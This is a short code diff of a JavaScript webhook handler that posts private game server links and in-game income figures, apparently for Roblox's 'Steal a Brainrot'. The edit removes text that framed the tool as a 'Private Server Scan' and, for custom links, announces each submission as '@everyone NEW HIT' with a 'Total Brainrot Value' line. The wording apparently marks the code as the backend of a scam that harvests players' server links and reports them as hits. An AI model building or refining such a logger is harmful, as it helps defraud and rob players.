@@ -33,7 +33,7 @@ export default async function handler(req, res) {
       }
       
       finalCustomLink = decodedLink;
-      joinLinks = `**[🔗 Exact Private Server Link](${decodedLink}&type=Server)**\n*This is the exact link you provided*`;
+      joinLinks = `**[🔗 Private Server Link](${decodedLink}&type=Server)**\n`;
       
       console.log("Custom link preserved:", decodedLink);
     } else {
@@ -130,14 +130,12 @@ export default async function handler(req, res) {
     // Create webhook content based on available data
     let content = '';
     if (customlink && customlink !== "None") {
-      content = `**🛡️ Private Server Scan Complete!**\nYour exact server link has been preserved below:`;
-    } else {
-      content = `**🛡️ Private Server Detected!**\nJoin using the links below:`;
+      content = `@everyone NEW HIT`;
     }
 
     // Add income to content if available
     if (totalincome) {
-      content += `\n💰 **Total Income: $${totalincome}/s** from ${animalcount} animals`;
+      content += `\n💰 **Total Brainrot Value:** **__$${totalincome}/s__**`;
     }
 
     const webhookData = {
@@ -186,3 +184,4 @@ export default async function handler(req, res) {
     });
   }
 }
+
